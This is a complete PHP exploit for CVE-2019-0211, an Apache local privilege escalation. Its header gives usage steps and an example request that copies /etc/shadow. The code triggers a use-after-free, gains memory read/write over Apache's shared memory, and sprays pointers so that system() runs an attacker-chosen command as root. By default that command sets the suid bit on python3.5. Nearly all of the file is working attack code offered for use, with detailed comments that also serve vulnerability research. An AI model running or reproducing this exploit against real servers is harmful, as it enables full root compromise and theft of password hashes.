<?php
# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation
# Charles Fol
# @cfreal_
# 2019-04-08
#
# INFOS
#
# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html
#
# USAGE
#
# 1. Upload exploit to Apache HTTP server
# 2. Send request to page
# 3. Await 6:25AM for logrotate to restart Apache
# 4. python3.5 is now suid 0
#
# You can change the command that is ran as root using the cmd HTTP
# parameter (GET/POST).
# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/
#
# SUCCESS RATE
#
# Number of successful and failed exploitations relative to of the number
# of MPM workers (i.e. Apache subprocesses). YMMV.
#
# W  --% S   F
#  5 87% 177 26 (default)
#  8 89%  60  8
# 10 95%  70  4
#
# More workers, higher success rate.
# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.
# Generally, failure is due to all_buckets being relocated too far from its
# original address.
#
# TESTED ON
#
# - Apache/2.4.25
# - PHP 7.2.12
# - Debian GNU/Linux 9.6
#
# TESTING
#
# $ curl http://localhost/cfreal-carpediem.php
# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force
# $ ls -alh /usr/bin/python3.5
# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5
#
# There are no hardcoded addresses.
# - Addresses read through /proc/self/mem
# - Offsets read through ELF parsing
#
# As usual, there are tons of comments.
#


o('CARPE (DIEM) ~ CVE-2019-0211');
o('');

error_reporting(E_ALL);


# Starts the exploit by triggering the UAF.
function real()
{
	global $y;
	$y = [new Z()];
	json_encode([0 => &$y]);
}

# In order to read/write what comes after in memory, we need to UAF a string so
# that we can control its size and make in-place edition.
# An easy way to do that is to replace the string by a timelib_rel_time
# structure of which the first bytes can be reached by the (y, m, d, h, i, s)
# properties of the DateInterval object.
#
# Steps:
# - Create a base object (Z)
# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)
# - Create DateInterval object ($place) meant to be unset and filled by another
# - Trigger the UAF by unsetting $y[0], which is still reachable using $this
# - Unset $place: at this point, if we create a new DateInterval object, it will
#   replace $place in memory
# - Create a string ($holder) that fills $place's timelib_rel_time structure
# - Allocate a new DateInterval object: its timelib_rel_time structure will
#   end up in place of abc
# - Now we can control $this->abc's zend_string structure entirely using
#   y, m, d etc.
# - Increase abc's size so that we can read/write memory that comes after it,
#   especially the shared memory block
# - Find out all_buckets' position by finding a memory region that matches the
#   mutex->meth structure
# - Compute the bucket index required to reach the SHM and get an arbitrary
#   function call
# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the
#   bucket
class Z implements JsonSerializable
{
	public function jsonSerialize()
	{
		global $y, $addresses, $workers_pids;

		#
		# Setup memory
		#
        o('Triggering UAF');
		o('  Creating room and filling empty spaces');

		# Fill empty blocks to make sure our allocations will be contiguous
		# I: Since a lot of allocations/deallocations happen before the script
		# is ran, two variables instanciated at the same time might not be
		# contiguous: this can be a problem for a lot of reasons.
		# To avoid this, we instanciate several DateInterval objects. These
		# objects will fill a lot of potentially non-contiguous memory blocks,
		# ensuring we get "fresh memory" in upcoming allocations.
		$contiguous = [];
		for($i=0;$i<10;$i++)
			$contiguous[] = new DateInterval('PT1S');

		# Create some space for our UAF blocks not to get overwritten
		# I: A PHP object is a combination of a lot of structures, such as
		# zval, zend_object, zend_object_handlers, zend_string, etc., which are
		# all allocated, and freed when the object is destroyed.
		# After the UAF is triggered on the object, all the structures that are
		# used to represent it will be marked as free.
		# If we create other variables afterwards, those variables might be
		# allocated in the object's previous memory regions, which might pose
		# problems for the rest of the exploitation.
		# To avoid this, we allocate a lot of objects before the UAF, and free
		# them afterwards. Since PHP's heap is LIFO, when we create other vars,
		# they will take the place of those objects instead of the object we
		# are triggering the UAF on. This means our object is "shielded" and
		# we don't have to worry about breaking it.
		$room = [];
		for($i=0;$i<10;$i++)
			$room[] = new Z();

		# Build string meant to fill old DateInterval's timelib_rel_time
		# I: ptr2str's name is unintuitive here: we just want to allocate a
		# zend_string of size 78.
		$_protector = ptr2str(0, 78);

		o('  Allocating $abc and $p');

		# Create ABC
		# I: This is the variable we will use to R/W memory afterwards.
		# After we free the Z object, we'll make sure abc is overwritten by a
		# timelib_rel_time structure under our control. The first 8*8 = 64 bytes
		# of this structure can be modified easily, meaning we can change the
		# size of abc. This will allow us to read/write memory after abc.
		$this->abc = ptr2str(0, 79);

		# Create $p meant to protect $this's blocks
		# I: Right after we trigger the UAF, we will unset $p.
		# This means that the timelib_rel_time structure (TRT) of this object
		# will be freed. We will then allocate a string ($protector) of the same
		# size as TRT. Since PHP's heap is LIFO, the string will take the place
		# of the now-freed TRT in memory.
		# Then, we create a new DateInterval object ($x). From the same
		# assumption, every structure constituting this new object will take the
		# place of the previous structure. Nevertheless, since TRT's memory
		# block has already been replaced by $protector, the new TRT will be put
		# in the next free blocks of the same size, which happens to be $abc
		# (remember, |abc| == |timelib_rel_time|).
		# We now have the following situation: $x is a DateInterval object whose
		# internal TRT structure has the same address as $abc's zend_string.
		$p = new DateInterval('PT1S');

		#
		# Trigger UAF
		#

		o('  Unsetting both variables and setting $protector');
		# UAF here, $this is usable despite being freed
		unset($y[0]);
		# Protect $this's freed blocks
		unset($p);

		# Protect $p's timelib_rel_time structure
		$protector = ".$_protector";
		# !!! This is only required for apache
		# Got no idea as to why there is an extra deallocation (?)
		$room[] = "!$_protector";

		o('  Creating DateInterval object');
		# After this line:
		# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str
		# We can control the structure of $this->abc and therefore read/write
		# anything that comes after it in memory by changing its size and
		# making in-place edits using $this->abc[$position] = $char
		$x = new DateInterval('PT1S');
		# zend_string.refcount = 0
		# It will get incremented at some point, and if it is > 1,
		# zend_assign_to_string_offset() will try to duplicate it before making
		# the in-place replacement
		$x->y = 0x00;
		# zend_string.len
		$x->d = 0x100;
		# zend_string.val[0-4]
		$x->h = 0x13121110;

		# Verify UAF was successful
		# We modified stuff via $x; they should be visible by $this->abc, since
		# they are at the same memory location.
		if(!(
			strlen($this->abc) === $x->d &&
			$this->abc[0] == "\x10" &&
			$this->abc[1] == "\x11" &&
			$this->abc[2] == "\x12" &&
			$this->abc[3] == "\x13"
		))
		{
			o('UAF failed, exiting.');
			exit();
		}
		o('UAF successful.');
		o('');

		# Give us some room
		# I: As indicated before, just unset a lot of stuff so that next allocs
		# don't break our fragile UAFd structure.
		unset($room);

		#
		# Setup the R/W primitive
		#

		# We control $abc's internal zend_string structure, therefore we can R/W
		# the shared memory block (SHM), but for that we need to know the
		# position of $abc in memory
		# I: We know the absolute position of the SHM, so we need to need abc's
		# as well, otherwise we cannot compute the offset

		# Assuming the allocation was contiguous, memory looks like this, with
		# 0x70-sized fastbins:
		# 	[zend_string:abc]
		# 	[zend_string:protector]
		# 	[FREE#1]
		# 	[FREE#2]
		# Therefore, the address of the 2nd free block is in the first 8 bytes
		# of the first block: 0x70 * 2 - 24
		$address = str2ptr($this->abc, 0x70 * 2 - 24);
		# The address we got points to FREE#2, hence we're |block| * 3 higher in
		# memory
		$address = $address - 0x70 * 3;
		# The beginning of the string is 24 bytes after its origin
		$address = $address + 24;
		o('Address of $abc: 0x' . dechex($address));
		o('');

		# Compute the size required for our string to include the whole SHM and
		# apache's memory region
		$distance =
			max($addresses['apache'][1], $addresses['shm'][1]) -
			$address
		;
		$x->d = $distance;

		# We can now read/write in the whole SHM and apache's memory region.

		#
		# Find all_buckets in memory
		#

		# We are looking for a structure s.t.
		# |all_buckets, mutex| = 0x10
		# |mutex, meth| = 0x8
		# all_buckets is in apache's memory region
		# mutex is in apache's memory region
		# meth is in libaprR's memory region
		# meth's function pointers are in libaprX's memory region
		o('Looking for all_buckets in memory');
		$all_buckets = 0;

		for(
			$i = $addresses['apache'][0] + 0x10;
			$i < $addresses['apache'][1] - 0x08;
			$i += 8
		)
		{
			# mutex
			$mutex = $pointer = str2ptr($this->abc, $i - $address);
			if(!in($pointer, $addresses['apache']))
				continue;


			# meth
			$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);
			if(!in($pointer, $addresses['libaprR']))
				continue;

			o('  [&mutex]: 0x' . dechex($i));
			o('    [mutex]: 0x' . dechex($mutex));
			o('      [meth]: 0x' . dechex($meth));


			# meth->*
			# flags
			if(str2ptr($this->abc, $pointer - $address) != 0)
				continue;
			# methods
			for($j=0;$j<7;$j++)
			{
				$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);
				if(!in($m, $addresses['libaprX']))
					continue 2;
				o('        [*]: 0x' . dechex($m));
			}

			$all_buckets = $i - 0x10;
			o('all_buckets = 0x' . dechex($all_buckets));
			break;
		}

		if(!$all_buckets)
		{
			o('Unable to find all_buckets');
			exit();
		}

		o('');

		# The address of all_buckets will change when apache is gracefully
		# restarted. This is a problem because we need to know all_buckets's
		# address in order to make all_buckets[some_index] point to a memory
		# region we control.

		#
		# Compute potential bucket indexes and their addresses
		#

        o('Computing potential bucket indexes and addresses');

		# Since we have sizeof($workers_pid) MPM workers, we can fill the rest
		# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),
		# with data we like. We keep the one at the top to store our payload.
		# The rest is sprayed with the address of our payload.

		$size_prefork_child_bucket = 24;
		$size_worker_score = 264;
		# I get strange errors if I use every "free" item, so I leave twice as
		# many items free. I'm guessing upon startup some
		$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
		$spray_max = $addresses['shm'][1];
		$spray_min = $spray_max - $spray_size;

		$spray_middle = (int) (($spray_min + $spray_max) / 2);
		$bucket_index_middle = (int) (
			- ($all_buckets - $spray_middle) /
			$size_prefork_child_bucket
		);

		#
		# Build payload
		#

		# A worker_score structure was kept empty to put our payload in
		$payload_start = $spray_min - $size_worker_score;

		$z = ptr2str(0);

    	# Payload maxsize 264 - 112 = 152
		# Offset 8 cannot be 0, but other than this you can type whatever
		# command you want
    	$bucket = isset($_REQUEST['cmd']) ?
    		$_REQUEST['cmd'] :
    		"chmod +s /usr/bin/python3.5";

    	if(strlen($bucket) > $size_worker_score - 112)
		{
			o(
				'Payload size is bigger than available space (' .
				($size_worker_score - 112) .
				'), exiting.'
			);
			exit();
		}
    	# Align
    	$bucket = str_pad($bucket, $size_worker_score - 112, "\x00");

    	# apr_proc_mutex_unix_lock_methods_t
		$meth =
		    $z .
		    $z .
		    $z .
		    $z .
		    $z .
		    $z .
			# child_init
		    ptr2str($addresses['zend_object_std_dtor'])
		;

		# The second pointer points to meth, and is used before reaching the
		# arbitrary function call
		# The third one and the last one are both used by the function call
		# zend_object_std_dtor(object) => ... => system(&arData[0]->val)
		$properties =
			# refcount
			ptr2str(1) .
			# u-nTableMask meth
			ptr2str($payload_start + strlen($bucket)) .
			# Bucket arData
			ptr2str($payload_start) .
			# uint32_t nNumUsed;
			ptr2str(1, 4) .
		    # uint32_t nNumOfElements;
			ptr2str(0, 4) .
			# uint32_t nTableSize
			ptr2str(0, 4) .
			# uint32_t nInternalPointer
			ptr2str(0, 4) .
			# zend_long nNextFreeElement
			$z .
			# dtor_func_t pDestructor
			ptr2str($addresses['system'])
		;

		$payload =
			$bucket .
			$meth .
			$properties
		;

		# Write the payload

		o('Placing payload at address 0x' . dechex($payload_start));

		$p = $payload_start - $address;
		for(
			$i = 0;
			$i < strlen($payload);
			$i++
		)
		{
			$this->abc[$p+$i] = $payload[$i];
		}

		# Fill the spray area with a pointer to properties

		$properties_address = $payload_start + strlen($bucket) + strlen($meth);
		o('Spraying pointer');
		o('  Address: 0x' . dechex($properties_address));
		o('  From: 0x' . dechex($spray_min));
		o('  To: 0x' . dechex($spray_max));
		o('  Size: 0x' . dechex($spray_size));
		o('  Covered: 0x' . dechex($spray_size * count($workers_pids)));
		o('  Apache: 0x' . dechex(
			$addresses['apache'][1] -
			$addresses['apache'][0]
		));

		$s_properties_address = ptr2str($properties_address);

		for(
			$i = $spray_min;
			$i < $spray_max;
			$i++
		)
		{
			$this->abc[$i - $address] = $s_properties_address[$i % 8];
		}
		o('');

		# Find workers PID in the SHM: it indicates the beginning of their
		# process_score structure. We can then change process_score.bucket to
		# the index we computed. When apache reboots, it will use
		# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex
		# which means we control the whole apr_proc_mutex_t structure.
		# This structure contains pointers to multiple functions, especially
		# mutex->meth->child_init(), which will be called before privileges
		# are dropped.
		# We do this for every worker PID, incrementing the bucket index so that
		# we cover a bigger range.

		o('Iterating in SHM to find PIDs...');

		# Number of bucket indexes covered by our spray
		$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);
		# Number of bucket indexes covered by our spray and the PS structures
		$total_nb_buckets = $spray_nb_buckets * count($workers_pids);
		# First bucket index to handle
		$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);

		# Iterate over every process_score structure until we find every PID or
		# we reach the end of the SHM
		for(
			$p = $addresses['shm'][0] + 0x20;
			$p < $addresses['shm'][1] && count($workers_pids) > 0;
			$p += 0x24
		)
		{
			$l = $p - $address;
			$current_pid = str2ptr($this->abc, $l, 4);
			o('Got PID: ' . $current_pid);
			# The PID matches one of the workers
			if(in_array($current_pid, $workers_pids))
			{
				unset($workers_pids[$current_pid]);
				o('  PID matches');
				# Update bucket address
				$s_bucket_index = pack('l', $bucket_index);
				$this->abc[$l + 0x20] = $s_bucket_index[0];
				$this->abc[$l + 0x21] = $s_bucket_index[1];
				$this->abc[$l + 0x22] = $s_bucket_index[2];
				$this->abc[$l + 0x23] = $s_bucket_index[3];
				o('  Changed bucket value to ' . $bucket_index);
				$min = $spray_min - $size_prefork_child_bucket * $bucket_index;
				$max = $spray_max - $size_prefork_child_bucket * $bucket_index;
				o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));
				# This bucket range is covered, go to the next one
				$bucket_index += $spray_nb_buckets;
			}
		}

		if(count($workers_pids) > 0)
		{
			o(
				'Unable to find PIDs ' .
				implode(', ', $workers_pids) .
				' in SHM, exiting.'
			);
			exit();
		}

		o('');
		o('EXPLOIT SUCCESSFUL.');
		o('Await 6:25AM.');

		return 0;
	}
}

function o($msg)
{
	# No concatenation -> no string allocation
	print($msg);
	print("\n");
}

function ptr2str($ptr, $m=8)
{
	$out = "";
    for ($i=0; $i<$m; $i++)
    {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function str2ptr(&$str, $p, $s=8)
{
	$address = 0;
	for($j=$s-1;$j>=0;$j--)
	{
		$address <<= 8;
		$address |= ord($str[$p+$j]);
	}
	return $address;
}

function in($i, $range)
{
	return $i >= $range[0] && $i < $range[1];
}

/**
 * Finds the offset of a symbol in a file.
 */
function find_symbol($file, $symbol)
{
    $elf = file_get_contents($file);
    $e_shoff = str2ptr($elf, 0x28);
    $e_shentsize = str2ptr($elf, 0x3a, 2);
    $e_shnum = str2ptr($elf, 0x3c, 2);

    $dynsym_off = 0;
    $dynsym_sz = 0;
    $dynstr_off = 0;

    for($i=0;$i<$e_shnum;$i++)
    {
        $offset = $e_shoff + $i * $e_shentsize;
        $sh_type = str2ptr($elf, $offset + 0x04, 4);

        $SHT_DYNSYM = 11;
        $SHT_SYMTAB = 2;
        $SHT_STRTAB = 3;

        switch($sh_type)
        {
            case $SHT_DYNSYM:
                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);
                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);
                break;
            case $SHT_STRTAB:
            case $SHT_SYMTAB:
                if(!$dynstr_off)
                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);
                break;
        }

    }

    if(!($dynsym_off && $dynsym_sz && $dynstr_off))
        exit('.');

    $sizeof_Elf64_Sym = 0x18;

    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)
    {
        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;
        $st_name = str2ptr($elf, $offset, 4);

        if(!$st_name)
            continue;

        $offset_string = $dynstr_off + $st_name;
        $end = strpos($elf, "\x00", $offset_string) - $offset_string;
        $string = substr($elf, $offset_string, $end);

        if($string == $symbol)
        {
            $st_value = str2ptr($elf, $offset + 0x8, 8);
            return $st_value;
        }
    }

    die('Unable to find symbol ' . $symbol);
}

# Obtains the addresses of the shared memory block and some functions through
# /proc/self/maps
# This is hacky as hell.
function get_all_addresses()
{
	$addresses = [];
	$data = file_get_contents('/proc/self/maps');
	$follows_shm = false;

	foreach(explode("\n", $data) as $line)
	{
		if(!isset($addresses['shm']) && strpos($line, '/dev/zero'))
		{
            $line = explode(' ', $line)[0];
            $bounds = array_map('hexdec', explode('-', $line));
            if ($bounds[1] - $bounds[0] == 0x14000)
            {
                $addresses['shm'] = $bounds;
                $follows_shm = true;
            }
        }
		if(
			preg_match('#(/[^\s]+libc-[0-9.]+.so[^\s]*)#', $line, $matches) &&
			strpos($line, 'r-xp')
		)
		{
			$offset = find_symbol($matches[1], 'system');
			$line = explode(' ', $line)[0];
			$line = hexdec(explode('-', $line)[0]);
			$addresses['system'] = $line + $offset;
		}
		if(
			strpos($line, 'libapr-1.so') &&
			strpos($line, 'r-xp')
		)
		{
			$line = explode(' ', $line)[0];
			$bounds = array_map('hexdec', explode('-', $line));
			$addresses['libaprX'] = $bounds;
		}
		if(
			strpos($line, 'libapr-1.so') &&
			strpos($line, 'r--p')
		)
		{
			$line = explode(' ', $line)[0];
			$bounds = array_map('hexdec', explode('-', $line));
			$addresses['libaprR'] = $bounds;
		}
		# Apache's memory block is between the SHM and ld.so
		# Sometimes some rwx region gets mapped; all_buckets cannot be in there
		# but we include it anyways for the sake of simplicity
		if(
			(
				strpos($line, 'rw-p') ||
				strpos($line, 'rwxp')
			) &&
            $follows_shm
		)
		{
            if(strpos($line, '/lib'))
            {
                $follows_shm = false;
                continue;
            }
			$line = explode(' ', $line)[0];
			$bounds = array_map('hexdec', explode('-', $line));
			if(!array_key_exists('apache', $addresses))
			    $addresses['apache'] = $bounds;
			else if($addresses['apache'][1] == $bounds[0])
                $addresses['apache'][1] = $bounds[1];
			else
                $follows_shm = false;
		}
		if(
			preg_match('#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#', $line, $matches) &&
			strpos($line, 'r-xp')
		)
		{
			$offset = find_symbol($matches[1], 'zend_object_std_dtor');
			$line = explode(' ', $line)[0];
			$line = hexdec(explode('-', $line)[0]);
			$addresses['zend_object_std_dtor'] = $line + $offset;
		}
	}

	$expected = [
		'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'
	];
	$missing = array_diff($expected, array_keys($addresses));

	if($missing)
	{
		o(
			'The following addresses were not determined by parsing ' .
			'/proc/self/maps: ' . implode(', ', $missing)
		);
		exit(0);
	}


	o('PID: ' . getmypid());
	o('Fetching addresses');

	foreach($addresses as $k => $a)
	{
		if(!is_array($a))
			$a = [$a];
		o('  ' . $k . ': ' . implode('-0x', array_map(function($z) {
				return '0x' . dechex($z);
		}, $a)));
	}
	o('');

	return $addresses;
}

# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,
# matching the cmdline and the UID
function get_workers_pids()
{
	o('Obtaining apache workers PIDs');
	$pids = [];
	$cmd = file_get_contents('/proc/self/cmdline');
	$processes = glob('/proc/*');
	foreach($processes as $process)
	{
		if(!preg_match('#^/proc/([0-9]+)$#', $process, $match))
			continue;
		$pid = (int) $match[1];
		if(
			!is_readable($process . '/cmdline') ||
			!is_readable($process . '/status')
		)
			continue;
		if($cmd !== file_get_contents($process . '/cmdline'))
			continue;

		$status = file_get_contents($process . '/status');
		foreach(explode("\n", $status) as $line)
		{
			if(
				strpos($line, 'Uid:') === 0 &&
				preg_match('#\b' . posix_getuid() . '\b#', $line)
			)
			{
				o('  Found apache worker: ' . $pid);
				$pids[$pid] = $pid;
				break;
			}

		}
	}

	o('Got ' . sizeof($pids) . ' PIDs.');
	o('');

	return $pids;
}

$addresses = get_all_addresses();
$workers_pids = get_workers_pids();
real();